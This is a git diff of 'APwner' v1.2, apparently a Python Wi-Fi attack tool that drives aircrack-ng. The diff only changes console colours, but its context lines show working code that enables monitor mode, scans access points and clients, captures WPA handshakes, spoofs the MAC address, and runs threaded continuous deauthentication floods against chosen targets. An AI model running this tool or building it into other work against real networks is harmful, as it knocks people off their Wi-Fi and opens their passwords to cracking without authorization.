@@ -11,20 +11,20 @@ from prettytable import PrettyTable
 from mods.colors import *
 
 def aireplay():
-    print(color.GREEN+"[+] Deauthenticating "+bssid+" on channel "+channel+"..."+color.END)
+    print(color.BLUE+"[+] Deauthenticating "+bssid+" on channel "+channel+"..."+color.END)
     subprocess.run(['xterm', '-geometry', '110x24+0+0', '-hold', '-e', 'aireplay-ng', '-0', '0', '-a', bssid, interface])
     
 
 def check_kill():
-    print(color.GREEN+"[+] Killing conflicting processes..."+color.END)
+    print(color.BLUE+"[+] Killing conflicting processes..."+color.END)
     subprocess.run(['airmon-ng', 'check' ,'kill'], capture_output=True).stdout.decode()
 
 def NetworkManager():
-    print(color.GREEN+"[+] Restarting conflicting processes..."+color.END)
+    print(color.BLUE+"[+] Restarting conflicting processes..."+color.END)
     subprocess.run(['systemctl', 'start', 'NetworkManager'])
 
 def airodump():
-    print(color.GREEN+"[+] Scanning for Access Points..."+color.END)
+    print(color.BLUE+"[+] Scanning for Access Points..."+color.END)
     dump_path = os.path.join('/tmp','apwner_dumps')
     os.makedirs(dump_path, exist_ok = True)
     subprocess.run(['xterm', '-geometry', '110x48-0+0', '-hold', '-e', 'airodump-ng', '-w' , '/tmp/apwner_dumps/dump', '--output-format', 'csv', interface])
@@ -65,7 +65,7 @@ def read_dump():
                     pwr = row[8].strip()
                     AP_dict.update({c:row[0]})
                     if int(row[8].strip()) > -50 and int(row[8].strip()) != -1:
-                        pwr = color.GREEN+pwr+color.END
+                        pwr = color.BLUE+pwr+color.END
                     elif int(row[8].strip()) > -68 and int(row[8].strip()) < -50 and int(row[8].strip()) != -1:
                         pwr = color.YELLOW+pwr+color.END
                     else:
@@ -75,7 +75,7 @@ def read_dump():
                     elif rep == 1:
                         str_rep = color.YELLOW+str(rep)+color.END
                     else:
-                        str_rep = color.GREEN+str(rep)+color.END
+                        str_rep = color.BLUE+str(rep)+color.END
                     airo_table.add_row([str(c), essid, bssid, channel, enc, pwr, str_rep])
                     c = str(int(c)+1)
         airo_table.align = "c"
@@ -89,11 +89,11 @@ def read_dump():
     while AP_ch != "R" and AP_ch != "I" and AP_ch != "e" and AP_ch not in AP_dict.keys():
         AP_ch = input("APs to target: ")
     if AP_ch == "R":
-        print(color.GREEN+"\n[+] Rescanning for Access Points"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for Access Points"+color.END)
         airodump()
         read_dump()  
     elif AP_ch == "I":
-        print(color.GREEN+"\n[+] Rescanning for interfaces"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for interfaces"+color.END)
         get_interface()
         airodump()
         read_dump()   
@@ -127,7 +127,7 @@ def read_dump():
     
 
 def airmon():
-    print(color.GREEN+"\n[+] Enabling Monitor mode on "+str(interface)+"..."+color.END)
+    print(color.BLUE+"\n[+] Enabling Monitor mode on "+str(interface)+"..."+color.END)
     cmd = subprocess.run(['airmon-ng', 'start', interface, channel], capture_output=True).stdout.decode()
     print(cmd)
 
@@ -156,7 +156,7 @@ def get_interface():
     while int_ch != "R" and int_ch != "e" and int_ch not in int_dict.keys():
         int_ch = input("Interface: ")
     if int_ch == "R":
-        print(color.GREEN+"\n[+] Rescanning for interfaces"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for interfaces"+color.END)
         get_interface()
     elif int_ch == "e":
         print(color.RED+"\n[-] Exiting..."+color.END)
@@ -175,31 +175,31 @@ def handshake():
         subprocess.run(['xterm', '-geometry', '110x24-0+0', '-hold', '-e', 'airodump-ng', '--bssid', bssid, '-c', channel, '-w' , handshake_path+'/'+essid+'_'+bssid, interface])
 
 def change_mac():
-    print(color.GREEN+"[+] Bringing interface "+str(interface)+" down..."+color.END)
+    print(color.BLUE+"[+] Bringing interface "+str(interface)+" down..."+color.END)
     subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
-    print(color.GREEN+"[+] Changing MAC address..."+color.END)
+    print(color.BLUE+"[+] Changing MAC address..."+color.END)
     cmd = subprocess.run(['macchanger', '-A' , interface], capture_output=True).stdout.decode()
     for line in cmd.strip().splitlines():
-        print("\t"+color.YELLOW+line+color.END)
-    print(color.GREEN+"[+] Bringing interface "+str(interface)+" up..."+color.END)
+        print(" "*4+color.YELLOW+line+color.END)
+    print(color.BLUE+"[+] Bringing interface "+str(interface)+" up..."+color.END)
     subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
     
 
 def reset_mac():
-    print(color.GREEN+"[+] Bringing interface "+str(interface)+" down..."+color.END)
+    print(color.BLUE+"[+] Bringing interface "+str(interface)+" down..."+color.END)
     subprocess.run(['ifconfig', interface ,'down'], capture_output=True).stdout.decode()
-    print(color.GREEN+"[+] Restoring MAC address..."+color.END)
+    print(color.BLUE+"[+] Restoring MAC address..."+color.END)
     cmd = subprocess.run(['macchanger', '-p' , interface], capture_output=True).stdout.decode()
     for line in cmd.strip().splitlines():
-        print("\t"+color.YELLOW+line+color.END)
-    print(color.GREEN+"[+] Bringing interface "+str(interface)+" up..."+color.END)
+        print(" "*4+color.YELLOW+line+color.END)
+    print(color.BLUE+"[+] Bringing interface "+str(interface)+" up..."+color.END)
     subprocess.run(['ifconfig', interface ,'up'], capture_output=True).stdout.decode()
 
 def read_dump_s():
     global s, station_ch, station_dict
     station_dict = {0:"All"}
     s = 0
-    print(color.GREEN+"[+] Scanning for stations on "+ bssid+"..."+color.END)
+    print(color.BLUE+"[+] Scanning for stations on "+ bssid+"..."+color.END)
     subprocess.run(['xterm', '-geometry', '110x48-0+0', '-hold', '-e', 'airodump-ng', '--bssid', bssid, '-w' , '/tmp/apwner_dumps/'+bssid, '--output-format', 'csv', '-c', channel, interface])
     nwst_file = max(glob.glob('/tmp/apwner_dumps/*.csv'), key=os.path.getctime)
     with open(nwst_file, 'r') as csvfile:
@@ -226,15 +226,15 @@ def read_dump_s():
     while len(station_ch) < 1 :
         station_ch = input("Stations to target: ")
     if station_ch == "R":
-        print(color.GREEN+"\n[+] Rescanning for stations"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for stations"+color.END)
         read_dump_s()
     elif station_ch == "A":
-        print(color.GREEN+"\n[+] Rescanning for Access Points"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for Access Points"+color.END)
         airodump()
         read_dump()
         read_dump_s()
     elif station_ch == "I":
-        print(color.GREEN+"\n[+] Rescanning for interfaces"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for interfaces"+color.END)
         get_interface()
         airodump()
         read_dump()
@@ -270,7 +270,7 @@ def ddos():
     else:
         run = True
         for x in station_ch.split():
-            print(color.GREEN+"[+] Deauthenticating "+station_dict[int(x)]+ " connected to "+bssid+" on channel "+channel+"..."+color.END)
+            print(color.BLUE+"[+] Deauthenticating "+station_dict[int(x)]+ " connected to "+bssid+" on channel "+channel+"..."+color.END)
         for x in station_ch.split():
             t = threading.Thread(target=aireplay_s, args=(x,))
             threads.append(t)
@@ -279,8 +279,6 @@ def ddos():
         for i in threads:
             i.join()
             
-        
-        
 def ReDo():
     print(color.GREEN+"\n[+] Job Done"+color.END)
     print("\n[I] : "+"Rescan for interfaces")
@@ -291,7 +289,7 @@ def ReDo():
     while redo_ch != "I" and redo_ch != "A" and redo_ch != "R" and redo_ch != "e":
         redo_ch = input("Restart or Exit?: ")
     if redo_ch == "I":
-        print(color.GREEN+"\n[+] Rescanning for interfaces"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for interfaces"+color.END)
         get_interface()
         airodump()
         read_dump()
@@ -299,14 +297,14 @@ def ReDo():
         attck_thread()
         ReDo()
     elif redo_ch == "A":
-        print(color.GREEN+"\n[+] Rescanning for Access Points"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for Access Points"+color.END)
         airodump()
         read_dump()
         read_dump_s()
         attck_thread()
         ReDo()
     elif redo_ch == "R":
-        print(color.GREEN+"\n[+] Rescanning for stations"+color.END)
+        print(color.BLUE+"\n[+] Rescanning for stations"+color.END)
         read_dump_s()
         attck_thread()
         ReDo()
@@ -333,4 +331,4 @@ banner = '''
 {2} / ___ \ |  __/  \ V  V / | | | ||  __/| |
 {2}/_/   \_\|_|      \_/\_/  |_| |_| \___||_|  {2}v1.2
                 {3}by kod34{1}
-'''.format(color.PURPLE, color.END, color.GREEN, color.RED)
+'''.format(color.PURPLE, color.END, color.BLUE, color.RED)
